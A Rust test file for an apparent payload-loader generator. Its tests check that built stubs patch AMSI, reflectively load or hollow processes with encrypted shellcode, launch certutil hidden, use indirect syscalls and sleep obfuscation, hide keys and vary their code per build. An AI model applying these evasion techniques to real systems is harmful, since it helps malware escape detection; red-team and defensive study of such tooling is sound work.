use super::*;
use crate::engine::obfuscation::StringStrategy;
use crate::engine::syscalls::SyscallsMode;
#[cfg(feature = "live-tests")]
use crate::plan::schema::Arch;
use crate::plan::schema::{StepFailure, StepOutcome};
use crate::techniques::living_off_the_land;
use crate::techniques::sleep;

fn strings() -> StringsConfig {
    StringsConfig::from_yaml(None).expect("default strings")
}

fn cipher(path: &str, marker: &str) -> PayloadCipher {
    PayloadCipher {
        nonce: [0u8; 24],
        key: [0u8; 32],
        plaintext_len: 16,
        path: path.to_string(),
        format: PayloadFormat::Shellcode,
        export: None,
        args: Vec::new(),
        args_override: false,
        marker: marker.to_string(),
        source: PayloadSource::Embedded,
    }
}

fn execution_step(index: usize) -> StepPayload {
    StepPayload {
        index,
        label: format!("reflective_loading 'p{index}'"),
        technique: serde_yml::from_str("technique: reflective_loading\n").expect("technique"),
        control: StepControl::default(),
        payload: Some(cipher(
            &format!("payload_{index}.bin"),
            &format!("STUB_MARKER_{index}"),
        )),
    }
}

fn preparation_step(index: usize) -> StepPayload {
    StepPayload {
        index,
        label: "patch_amsi".to_string(),
        technique: serde_yml::from_str("technique: patch_amsi\n").expect("technique"),
        control: StepControl::default(),
        payload: None,
    }
}

fn lol_step(index: usize) -> StepPayload {
    StepPayload {
        index,
        label: "living_off_the_land".to_string(),
        technique: TechniqueKind::LivingOffTheLand {
            params: living_off_the_land::Params {
                binary: "certutil.exe".to_string(),
                args: vec!["-f".to_string()],
                ..Default::default()
            },
        },
        control: StepControl::default(),
        payload: None,
    }
}

fn sleep_step(index: usize, ms: u64) -> StepPayload {
    StepPayload {
        index,
        label: "sleep".to_string(),
        technique: TechniqueKind::Sleep {
            params: sleep::Params { ms },
        },
        control: StepControl::default(),
        payload: None,
    }
}

fn template() -> String {
    std::fs::read_to_string(
        std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("src")
            .join("engine")
            .join("templates")
            .join("main.rs.tpl"),
    )
    .expect("template")
}

fn render(steps: Vec<StepPayload>) -> String {
    let params = StepsParams {
        steps,
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    render_builtin(
        &template(),
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    )
    .expect("render")
}

fn render_debug(steps: Vec<StepPayload>) -> String {
    let params = StepsParams {
        steps,
        build_args: BTreeMap::new(),
        debug: true,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    render_builtin(
        &template(),
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    )
    .expect("render")
}

#[test]
fn a_sleep_hook_emits_the_runtime_and_the_proxy_block() {
    let params = StepsParams {
        steps: Vec::new(),
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    let api = ApiResolutionConfig {
        mode: crate::engine::api_resolution::ApiResolutionMode::Proxy,
        hooks: crate::engine::api_resolution::HooksConfig {
            sleep: Some(crate::engine::api_resolution::SleepHookConfig {
                min_ms: 1000,
                max_ms: 600_000,
            }),
        },
        ..ApiResolutionConfig::default()
    };
    let syscalls = SyscallsConfig {
        mode: SyscallsMode::Indirect,
        resolver: crate::engine::syscalls::Resolver::HellsGate,
        ..Default::default()
    };
    let out = render_builtin(&template(), &params, &strings(), &syscalls, &api).expect("render");

    assert!(out.contains("mod sleep_runtime {"), "runtime missing");
    assert!(out.contains("mod api_resolution {"), "proxies missing");
    assert!(
        out.contains("extern \"system\" fn proxy_0"),
        "the Sleep proxy missing"
    );
    assert!(
        out.contains("crate::sleep_runtime::ekko_sleep"),
        "the proxy does not call the shared runtime"
    );
    // The debug prelude uses `$` as macro syntax, so cut it before looking
    // for an unsubstituted placeholder.
    let source = out
        .split("// --- Debug instrumentation")
        .next()
        .unwrap_or(&out);
    assert!(
        !source.contains('$'),
        "an unsubstituted placeholder survived"
    );
}

#[test]
fn a_delivery_build_emits_no_stub_marker() {
    let out = render(vec![execution_step(0)]);
    assert!(
        !out.contains("stub_marker"),
        "a non-debug build must not touch the marker: {out}"
    );
    assert!(
        !out.contains("STUB_MARKER"),
        "a non-debug build must not embed the marker: {out}"
    );
}

#[test]
fn a_debug_build_prints_the_stub_marker() {
    let out = render_debug(vec![execution_step(0)]);
    assert!(
        out.contains("eprintln!(\"{stub_marker}\")"),
        "a debug build should print the marker: {out}"
    );
}

#[test]
fn two_execution_steps_render_two_modules() {
    let out = render(vec![execution_step(0), execution_step(1)]);
    assert!(out.contains("mod step_0 {"), "step 0 module missing");
    assert!(out.contains("mod step_1 {"), "step 1 module missing");
    assert!(
        out.contains("include_bytes!(\"payload_0.bin\")"),
        "payload 0 not embedded"
    );
    assert!(
        out.contains("include_bytes!(\"payload_1.bin\")"),
        "payload 1 not embedded"
    );
    assert!(out.contains("fn run() -> Result<i32, String>"));
}

#[test]
fn a_preparation_step_is_wrapped_with_a_run_adapter() {
    let out = render(vec![preparation_step(0)]);
    assert!(out.contains("mod step_0 {"), "prep module missing");
    assert!(out.contains("pub fn patch_amsi"), "prep fragment missing");
    assert!(
        out.contains("pub fn run() -> Result<bool, String>"),
        "prep adapter missing"
    );
    assert!(
        out.contains("Ok(false) => return Ok(0)"),
        "the abort arm is missing"
    );
}

#[test]
fn a_bouncer_decoy_step_embeds_and_decrypts_its_asset() {
    let step = StepPayload {
            index: 0,
            label: "bouncer".to_string(),
            technique: serde_yml::from_str(
                "technique: bouncer\nparams:\n  on_reject:\n    action: decoy\n    decoy: { path: x, payload: p }\n  require: [{ hostname: h }]\n",
            )
            .expect("technique"),
            control: StepControl::default(),
            payload: Some(cipher("decoy_0.bin", "M")),
        };
    let out = render(vec![step]);
    assert!(out.contains("fn asset_bytes()"), "asset helper missing");
    assert!(
        out.contains("include_bytes!(\"decoy_0.bin\")"),
        "the decoy asset is not embedded"
    );
    assert!(
        out.contains("crate::decrypt_step(ASSET_ENC"),
        "the decoy is not decrypted through the shared helper"
    );
    assert!(
        out.contains("pub fn run() -> Result<bool, String>"),
        "the preparation adapter is missing"
    );
}

#[test]
fn a_bouncer_without_a_decoy_still_compiles_the_helper() {
    let mut step = preparation_step(0);
    step.technique =
        serde_yml::from_str("technique: bouncer\nparams:\n  require: [{ hostname: h }]\n")
            .expect("technique");
    let out = render(vec![step]);
    assert!(out.contains("fn asset_bytes()"), "stub helper missing");
    assert!(out.contains("Err(String::new())"), "stub body missing");
    assert!(
        !out.contains("include_bytes!"),
        "a bouncer without a decoy must not embed an asset"
    );
}

#[test]
fn a_drop_step_embeds_and_decrypts_its_asset() {
    let step = StepPayload {
        index: 0,
        label: "drop".to_string(),
        technique: serde_yml::from_str(
            "technique: drop\nparams: { path: \"TEST.docx\", payload: doc }\n",
        )
        .expect("technique"),
        control: StepControl::default(),
        payload: Some(cipher("asset_0.bin", "M")),
    };
    let out = render(vec![step]);
    assert!(out.contains("fn asset_bytes()"), "asset helper missing");
    assert!(
        out.contains("include_bytes!(\"asset_0.bin\")"),
        "the dropped asset is not embedded"
    );
    assert!(
        out.contains("pub fn run() -> Result<bool, String>"),
        "the preparation adapter is missing"
    );
}

#[test]
fn a_living_off_the_land_step_renders_a_launcher() {
    let out = render(vec![lol_step(0)]);
    assert!(out.contains("pub fn run_exec()"), "launcher missing");
    assert!(out.contains("CreateProcessA"), "CreateProcessA missing");
    assert!(out.contains("CREATE_NO_WINDOW"), "hidden window missing");
    assert!(
        out.contains("step_0::run()"),
        "runner does not call the control step"
    );
}

#[test]
fn a_sleep_step_is_a_single_inline_line() {
    let out = render(vec![execution_step(0), sleep_step(1, 250)]);
    assert!(
        out.contains("std::thread::sleep(std::time::Duration::from_millis(250));"),
        "inline sleep missing: {out}"
    );
    assert!(!out.contains("mod step_1 {"), "sleep must not get a module");
}

#[test]
fn per_step_args_reach_the_runner_obfuscated() {
    let mut step = execution_step(0);
    if let Some(payload) = step.payload.as_mut() {
        payload.args = vec!["--first".to_string()];
        payload.args_override = true;
    }
    let out = render(vec![step]);
    assert!(out.contains("crate::set_stage_args("), "step args not set");
    assert!(
        !out.contains("--first"),
        "the arg leaked in cleartext: {out}"
    );
}

#[test]
fn a_staged_payload_has_no_embedded_ciphertext() {
    let mut step = execution_step(0);
    if let Some(payload) = step.payload.as_mut() {
        payload.source = PayloadSource::Staged;
    }
    let out = render(vec![step]);
    assert!(
        out.contains("crate::take_staged_payload()"),
        "the staged slot is not read"
    );
    assert!(
        !out.contains("include_bytes!"),
        "a strictly staged payload must not embed ciphertext"
    );
}

#[test]
fn a_staged_payload_with_a_fallback_embeds_the_copy_it_falls_back_to() {
    let mut step = execution_step(0);
    if let Some(payload) = step.payload.as_mut() {
        payload.source = PayloadSource::StagedWithFallback;
    }
    let out = render(vec![step]);
    assert!(
        out.contains("crate::take_staged_payload()"),
        "the staged slot is not read"
    );
    assert!(
        out.contains("include_bytes!(\"payload_0.bin\")"),
        "the embedded fallback is missing"
    );
    assert!(
        out.contains("decrypt_step(enc, &payload_nonce, &payload_key"),
        "the fallback is not decrypted through the rebuilt secrets"
    );
}

/// The runner must not hand the stage a cleartext nonce and key next to the
/// ciphertext: both are rebuilt at run time under the configured strategy.
#[test]
fn the_payload_nonce_and_key_are_never_cleartext_in_the_runner() {
    let nonce_hex = hex::encode([0xAB; 24]);
    let key_hex = hex::encode([0xCD; 32]);
    let configs = [
        strings(),
        StringsConfig {
            strategy: StringStrategy::Stack,
            key: None,
        },
    ];

    for source in [PayloadSource::Embedded, PayloadSource::StagedWithFallback] {
        let mut step = execution_step(0);
        let payload = step.payload.as_mut().expect("execution payload");
        payload.nonce = [0xAB; 24];
        payload.key = [0xCD; 32];
        payload.source = source;
        let params = StepsParams {
            steps: vec![step],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };

        for config in &configs {
            let out = render_builtin(
                &template(),
                &params,
                config,
                &SyscallsConfig::default(),
                &ApiResolutionConfig::default(),
            )
            .expect("render");
            assert!(
                !out.contains(&nonce_hex),
                "the nonce leaked in cleartext for {source:?} under {:?}: {out}",
                config.strategy
            );
            assert!(
                !out.contains(&key_hex),
                "the key leaked in cleartext for {source:?} under {:?}: {out}",
                config.strategy
            );
            assert!(
                out.contains("let payload_nonce: String = "),
                "the nonce is not rebuilt at run time for {source:?} under {:?}: {out}",
                config.strategy
            );
            assert!(
                out.contains("let payload_key: String = "),
                "the key is not rebuilt at run time for {source:?} under {:?}: {out}",
                config.strategy
            );
            assert!(
                out.contains("decrypt_step(enc, &payload_nonce, &payload_key, 16)"),
                "the runner does not pass the rebuilt secrets for {source:?} under {:?}: {out}",
                config.strategy
            );
        }
    }
}

#[test]
fn an_exe_build_renders_the_plain_entry() {
    let out = render(vec![execution_step(0)]);
    assert!(
        out.contains(crate::engine::entry::EXE_ENTRY),
        "the executable entry is missing"
    );
    assert!(!out.contains("DllMain"), "an executable exports nothing");
    assert!(!out.contains("dll_run_detached"));
}

#[test]
fn a_dll_build_renders_the_exports_instead_of_main() {
    let params = StepsParams {
        steps: vec![execution_step(0)],
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Dll,
        entry: DllEntry::Export("Start".to_string()),
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    let source = render_builtin(
        &template(),
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    )
    .expect("render");
    assert!(
        source.contains("pub extern \"system\" fn Start("),
        "export missing"
    );
    assert!(source.contains("fn DllMain"), "DllMain missing");
    assert!(!source.contains("fn main("), "a DLL has no main");
    assert!(
        source.contains("fn run() -> Result<i32, String>"),
        "the chain must stay shared"
    );
    assert!(
        !source.contains("ENTRY_BLOCK"),
        "the placeholder must be substituted"
    );
}

/// A custom stub owns its entry point: without `$ENTRY_BLOCK$` nothing is
/// injected, so the `fn main` it already declares is what runs.
#[test]
fn a_custom_stub_keeps_its_own_main() {
    let params = StepsParams {
        steps: Vec::new(),
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    let rendered = render_custom(
        "fn main() {}\n",
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    )
    .expect("render");
    assert!(rendered.source.starts_with("fn main() {}"));
    assert!(!rendered.source.contains("dll_run_chain"));
}

#[test]
fn a_missing_placeholder_is_an_error() {
    let params = StepsParams {
        steps: vec![execution_step(0)],
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    let result = render_builtin(
        "fn main() {}",
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    );
    assert!(result.is_err());
}

#[test]
fn a_custom_stub_ignoring_the_step_blocks_warns() {
    let params = StepsParams {
        steps: vec![execution_step(0)],
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    let rendered = render_custom(
        "fn main() {}",
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    )
    .expect("render");
    assert!(
        rendered.warnings.iter().any(|w| w.contains("STEP_MODULES")),
        "expected a step-modules warning: {:?}",
        rendered.warnings
    );
    assert!(
        rendered
            .warnings
            .iter()
            .any(|w| w.contains("STEP_RUNNER_BODY")),
        "expected a runner warning: {:?}",
        rendered.warnings
    );
}

#[test]
fn a_staged_payload_failure_honours_on_fail_continue() {
    let mut step = execution_step(0);
    step.control = StepControl {
        on_success: StepOutcome::Continue,
        on_fail: StepFailure::Continue,
        delay_ms: 0,
    };
    if let Some(payload) = step.payload.as_mut() {
        payload.source = PayloadSource::Staged;
    }
    let out = render(vec![step]);
    assert!(
        out.contains("'step_0: {"),
        "the step block is not labeled: {out}"
    );
    assert!(
        out.contains("eprintln!(\"{e}\"); break 'step_0;"),
        "a staging failure does not break out of the step: {out}"
    );
}

#[test]
fn a_decryption_failure_honours_on_fail_exit() {
    let mut step = execution_step(0);
    step.control = StepControl {
        on_success: StepOutcome::Continue,
        on_fail: StepFailure::Exit,
        delay_ms: 0,
    };
    let out = render(vec![step]);
    assert!(
        out.contains("Err(e) => { eprintln!(\"{e}\"); return Ok(0); }"),
        "a decryption failure does not take the exit action: {out}"
    );
}

#[test]
fn a_payload_name_cannot_inject_a_source_line_into_the_step_comment() {
    let mut step = execution_step(0);
    step.label = "reflective_loading 'p\nfn injected() {}'".to_string();
    let out = render(vec![step]);
    assert!(
        out.contains("// --- step 0: reflective_loading 'p fn injected() {}' ---"),
        "the newline was not flattened into the comment: {out}"
    );
    assert!(
        !out.lines()
            .any(|line| line.trim_start().starts_with("fn injected()")),
        "the payload name produced a source line: {out}"
    );
}

/// The `nt_*` helpers are emitted whenever a technique needs them, in both
/// syscall modes, so the custom-stub warning must not depend on `indirect`.
#[test]
fn a_custom_stub_ignoring_the_syscalls_block_warns_without_indirect_mode() {
    let mut step = execution_step(0);
    step.technique = serde_yml::from_str("technique: process_hollowing\n").expect("technique");
    let params = StepsParams {
        steps: vec![step],
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    let rendered = render_custom(
        "fn main() {}\n",
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    )
    .expect("render");
    assert!(
        rendered
            .warnings
            .iter()
            .any(|w| w.contains("SYSCALLS_BLOCK")),
        "expected a syscalls warning under mode: none: {:?}",
        rendered.warnings
    );
}

#[test]
fn on_success_stop_returns_the_last_code() {
    let mut step = execution_step(0);
    step.control = StepControl {
        on_success: StepOutcome::Stop,
        on_fail: StepFailure::Continue,
        delay_ms: 5,
    };
    let out = render(vec![step]);
    assert!(out.contains("return Ok(last);"), "success stop missing");
    assert!(
        out.contains("eprintln!(\"{e}\");"),
        "failure continue missing"
    );
    assert!(
        out.contains("std::thread::sleep(std::time::Duration::from_millis(5));"),
        "delay missing"
    );
}

/// Compiles a preparation + execution + control stub to a PE. The real
/// end-to-end check of the step renderer; marked `#[ignore]` because it
/// needs `rustc` and the compiled dependencies (`cargo test --features live-tests -- --ignored`).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn a_step_stub_compiles_to_a_pe() {
    use crate::engine::compiler;

    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("build")
        .join("steps_test");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("payload_1.bin"), [0u8; 16]).unwrap();

    let mut prep = preparation_step(0);
    prep.technique = serde_yml::from_str("technique: anti_debug\nparams: { action: continue }\n")
        .expect("technique");
    let params = StepsParams {
        steps: vec![prep, execution_step(1), sleep_step(2, 1), lol_step(3)],
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    let source = render_builtin(
        &template(),
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    )
    .expect("render");
    let main_path = dir.join("main.rs");
    std::fs::write(&main_path, &source).unwrap();

    let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
    let out = dir.join("out.exe");
    compiler::compile_stub(&main_path, &out, &deps, compiler::CompileOptions::default())
        .expect("compile");
    let bytes = std::fs::read(&out).expect("read");
    assert_eq!(&bytes[..2], b"MZ", "the stub must be a Windows PE");
}

/// Compiles a `kind: dll` stub and checks the artifact is a real library
/// that exports the entry points. The end-to-end check of the DLL output;
/// marked `#[ignore]` for the same reasons as the executable one.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn a_dll_stub_compiles_to_a_library_with_exports() {
    use crate::engine::compiler::{self, CompileOptions};

    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("build")
        .join("dll_test");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("payload_0.bin"), [0u8; 16]).unwrap();

    let params = StepsParams {
        steps: vec![execution_step(0)],
        build_args: BTreeMap::new(),
        debug: false,
        windows_subsystem: false,
        kind: OutputKind::Dll,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    };
    let source = render_builtin(
        &template(),
        &params,
        &strings(),
        &SyscallsConfig::default(),
        &ApiResolutionConfig::default(),
    )
    .expect("render");
    let main_path = dir.join("main.rs");
    std::fs::write(&main_path, &source).unwrap();

    let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
    let out = dir.join("loader.dll");
    compiler::compile_stub(
        &main_path,
        &out,
        &deps,
        CompileOptions {
            kind: OutputKind::Dll,
            ..CompileOptions::default()
        },
    )
    .expect("compile");

    let bytes = std::fs::read(&out).expect("read");
    let info = crate::engine::pe::parse(&bytes).expect("a valid PE");
    assert!(
        crate::engine::pe::is_dll(info.characteristics),
        "IMAGE_FILE_DLL must be set"
    );
    // The export names live in the export directory as plain ASCII.
    let text = String::from_utf8_lossy(&bytes);
    for export in ["DllMain", "JNI_OnLoad", "Run"] {
        assert!(text.contains(export), "missing export '{export}'");
    }
}

/// The polymorphism goal: two builds of the same plan must not share a
/// `.text`. Compiles the same source with two source-level seeds (phase 2)
/// and compares the code section. Marked `#[ignore]` for the same reasons as
/// the other compile tests; the measured numbers live in
/// `docs/design/polymorphism.md`.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn two_polymorphism_seeds_differ_in_the_text_section() {
    use crate::engine::compiler;
    use crate::engine::pe;
    use sha2::{Digest, Sha256};

    fn text_hash(path: &std::path::Path) -> String {
        let bytes = std::fs::read(path).expect("read");
        let info = pe::parse(&bytes).expect("a valid PE");
        let text = info
            .sections
            .iter()
            .find(|section| &section.name[..5] == b".text")
            .expect(".text section");
        let start = text.pointer_to_raw_data as usize;
        let end = start + text.size_of_raw_data as usize;
        hex::encode(Sha256::digest(&bytes[start..end]))
    }

    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("build")
        .join("poly_test");
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("payload_0.bin"), [0u8; 16]).unwrap();

    let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
    let mut hashes = Vec::new();
    for (index, seed) in [0x1111_2222_3333_4444u64, 0xAAAA_BBBB_CCCC_DDDDu64]
        .into_iter()
        .enumerate()
    {
        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: Some(seed),
        };
        let source = render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        let main_path = dir.join(format!("main_{index}.rs"));
        std::fs::write(&main_path, &source).unwrap();
        let out = dir.join(format!("out_{index}.exe"));
        compiler::compile_stub(&main_path, &out, &deps, compiler::CompileOptions::default())
            .expect("compile");
        hashes.push(text_hash(&out));
    }

    assert_ne!(
        hashes[0], hashes[1],
        "two polymorphism seeds produced the same .text"
    );
}
